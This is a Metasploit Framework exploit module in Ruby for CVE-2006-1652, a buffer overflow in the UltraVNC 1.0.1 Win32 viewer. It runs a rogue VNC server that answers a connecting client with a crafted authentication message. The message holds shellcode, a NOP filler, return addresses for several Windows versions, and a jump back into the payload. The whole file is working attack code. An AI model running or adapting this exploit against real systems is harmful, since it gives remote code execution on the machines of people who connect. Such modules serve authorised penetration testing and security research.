##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::TcpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'UltraVNC 1.0.1 Client Buffer Overflow',
      'Description'    => %q{
        This module exploits a buffer overflow in UltraVNC Win32
        Viewer 1.0.1 Release.
      },
      'Arch' => ARCH_X86,
      'Author'         => 'MC',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2006-1652' ],
          [ 'OSVDB', '24456' ],
          [ 'BID', '17378' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 500,
          'BadChars' => "\x00",
          'MaxNops'  => 0,
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 2000 SP4 English',	{ 'Ret' => 0x7c2ec68b } ],
          [ 'Windows XP SP2 English',	{ 'Ret' => 0x77dc15c0 } ],
          [ 'Windows 2003 SP1 English',	{ 'Ret' => 0x76aa679b } ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 4 2006',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The VNCServer daemon port to listen on", 5900 ])
      ], self.class)
  end

  def on_client_connect(client)

    rfb = "RFB 003.006\n"

    client.put(rfb)
  end

  def on_client_data(client_socket)
    regenerated_payload = regenerate_payload(client_socket: client_socket)

    return unless regenerated_payload

    filler = make_nops(980 - regenerated_payload.encoded.length)

    sploit =  "\x00\x00\x00\x00\x00\x00\x04\x06" + "Requires Ultr@VNC Authentication\n"
    sploit << regenerated_payload.encoded + filler + [target.ret].pack('V')
    sploit << "PASSWORD" + [0xe8, -997].pack('CV')

    print_status("Sending #{sploit.length} bytes to #{client_socket.getpeername}:#{client_socket.peerport}...")
    client_socket.put(sploit)

    handler
    service.close_client(client_socket)
  end

end
